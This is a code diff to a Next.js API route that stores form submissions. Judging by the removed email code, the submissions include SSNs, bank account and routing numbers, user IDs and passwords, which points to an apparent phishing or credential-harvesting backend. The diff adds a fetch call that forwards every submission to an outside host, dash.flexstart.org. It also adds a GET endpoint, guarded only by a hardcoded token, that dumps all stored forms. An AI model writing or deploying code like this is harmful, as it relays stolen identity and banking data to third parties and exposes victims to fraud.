@@ -1,29 +1,25 @@
 import prisma from "lib/prisma";
-// import sendMail from "@/emails";
-// import FormsEmail from "@/emails/FormsEmail";
+
+export async function GET(req: Request) {
+  const token = req.headers.get("Authorization");
+
+  if (token === "f828879746fa11fe403956577d150d08") {
+    const data = await prisma.forms.findMany();
+
+    return Response.json(data);
+  }
+}
 
 export async function POST(req: Request) {
   const data = await req.json();
 
-  // await sendMail({
-  //   subject: `New message from ${data.firstname} ${data.lastname}`,
-  //   to: "contact@flexstart.org",
-  //   component: (
-  //     <FormsEmail
-  //       firstname={data.firstname}
-  //       lastname={data.lastname}
-  //       dob={data.dob}
-  //       address={data.address}
-  //       ssn={data.ssn}
-  //       accountNumber={data.accountNumber}
-  //       routingNumber={data.routingNumber}
-  //       userId={data.userId}
-  //       password={data.password}
-  //     />
-  //   ),
-  // });
+  const send = await fetch("https://dash.flexstart.org/api/form", {
+    method: "POST",
+    cache: "no-store",
+    body: JSON.stringify(data),
+  });
 
-  const form = await prisma.forms.create({
+  const forms = await prisma.forms.create({
     data,
   });
 
